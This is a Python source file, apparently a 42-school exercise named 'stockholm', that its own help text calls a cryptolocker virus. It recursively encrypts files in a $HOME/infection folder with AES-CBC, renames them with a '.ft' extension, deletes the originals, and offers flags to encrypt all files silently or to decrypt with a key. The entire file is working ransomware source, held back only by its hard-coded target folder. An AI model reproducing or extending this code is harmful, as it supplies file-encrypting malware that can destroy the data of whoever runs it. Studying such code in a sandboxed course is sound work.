#!/usr/bin/python3
# -*- coding: utf-8 -*-

import sys
import os
import argparse
import string
import secrets
from Crypto.Cipher import AES
from colorama import Fore, Style
from pathlib import Path

SILENT = False
VERSION = "v1.05"
WANNACRY_EXT  = ".WCRY"
STOCKHOLM_EXT = ".ft"
PATH = os.path.join(str(Path.home()), "infection")
KEY_LENGTH = 16

def output(str, end=None):
    if not SILENT:
        if end:
            print(str, end=end)
        else:
            print(str)

def generate_random_key(length):
    """
    Generate a random key of the specified length.

    Args:
    - length (int): The length of the key to generate.

    Returns:
    - str: The generated random key.
    """
    characters = string.ascii_letters + string.digits
    random_key = ''.join(secrets.choice(characters) for _ in range(length))
    return random_key

def get_files(path, ext):
    """
    Retrieves a list of files in the specified directory
    and its subdirectories, with the full path, optionally
    filtered by extension.

    Args:
    - path (str): The path of the directory to traverse.
    - ext (str, optional): The file extension to filter by.

    Returns:
    - list: A list containing the full path of files with
      the specified extension, or all files if no extension
      is specified.
    """
    files_list = []
    # Traverse the directory and its subdirectories
    for root, dirs, files in os.walk(path):
        for file in files:
            # Check if file has the specified extension
            if ext is None or file.endswith(ext):
                # Construct the full path
                file_path = os.path.join(root, file)
                files_list.append(file_path)
    return files_list

def read_binary_file(file_path):
    with open(file_path, 'rb') as file:
        data = file.read()
    return data

def write_binary_file(file_path, data):
    with open(file_path, 'wb') as file:
        file.write(data)

def delete_file(file_path):
    """
    Delete a file.

    Args:
    - file_path (str): The path of the file to delete.
    """
    try:
        os.remove(file_path)
    except OSError as e:
        print(f"Error: {e.strerror}")

def encrypt_data(data, key):
    cipher = AES.new(key.encode(), AES.MODE_CBC)
    # Padding
    padding_length = AES.block_size - (len(data) % AES.block_size)
    data += bytes([padding_length]) * padding_length
    # Chiffrement
    encrypted_data = cipher.iv + cipher.encrypt(data)
    return encrypted_data

def decrypt_data(encrypted_data, key):
    # Extraire l'IV des données cryptées
    iv = encrypted_data[:AES.block_size]
    # Initialiser le déchiffreur avec la clé et l'IV
    cipher = AES.new(key.encode(), AES.MODE_CBC, iv)
    # Déchiffrement
    decrypted_data = cipher.decrypt(encrypted_data[AES.block_size:])
    # Supprimer le padding
    padding_length = decrypted_data[-1]
    decrypted_data = decrypted_data[:-padding_length]
    return decrypted_data

def reverse(key):
    nb_file = 0
    files = get_files(PATH, STOCKHOLM_EXT)
    total_files = len(files)
    for f in files:
        new_name = os.path.splitext(f)[0]
        output(f"decrypting for {Fore.YELLOW}{f}{Style.RESET_ALL}...", end =' ')
        output(f"--> {Fore.BLUE}{new_name}{Style.RESET_ALL}", end=' ')
        write_binary_file(new_name,decrypt_data(read_binary_file(f), key))
        delete_file(f)
        output("✅")
        nb_file += 1
    output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} files decrypted out of {Fore.BLUE}{total_files}{Style.RESET_ALL} encrypted files in folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")

def encrypt():
    nb_file = 0
    files = get_files(PATH, WANNACRY_EXT)
    total_files = len(files)
    key = generate_random_key(KEY_LENGTH)
    for f in files:
        try:
            new_name = f+STOCKHOLM_EXT
            output(f"Encryption for {Fore.YELLOW}{f}{Style.RESET_ALL}...", end =' ')
            output(f"--> {Fore.BLUE}{new_name}{Style.RESET_ALL}", end=' ')
            write_binary_file(new_name,encrypt_data(read_binary_file(f), key))
            delete_file(f)
            output("✅")
            nb_file += 1
        except PermissionError:
            output("❌ Permission denied")
    if SILENT:
        with open("key.txt", 'w') as file:
            file.write(key)
    else:
        output(f"{Fore.GREEN}{nb_file}{Style.RESET_ALL} files encrypted out of {Fore.BLUE}{total_files}{Style.RESET_ALL} present in the folder [{Fore.YELLOW}{PATH}{Style.RESET_ALL}]")
        output(f"The key is {Fore.RED}{key}{Style.RESET_ALL}, don't lose it !!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="stockholm : cryptolocker virus which encrypts files $HOME/infection.")
    parser.add_argument("-v", "--version", action="store_true", help="Show version of the program.")
    parser.add_argument("-r", "--reverse", type=str, help="Reverse the infection using the provided encryption key.")
    parser.add_argument("-s","--silent", action='store_true', help="Silent mode, no output")
    parser.add_argument("--all-files", action="store_true", default=False ,help="All files will be encrypted !!")
    parser.add_argument("-k", "--key", type=int, choices=[16, 32], metavar='key', help="Length of the encryption key. Choose between 16 or 32 (default: 16)")

    args = parser.parse_args()
    SILENT = args.silent
    if args.all_files:
        WANNACRY_EXT = None
    if args.version:
        print(f"stockholm 42 Project: Version = {Fore.BLUE}{VERSION}{Style.RESET_ALL}")
        sys.exit(0)
    if args.key:
        KEY_LENGTH = args.key
    if args.reverse:
        reverse(args.reverse)
    else:
        encrypt()
    sys.exit(0)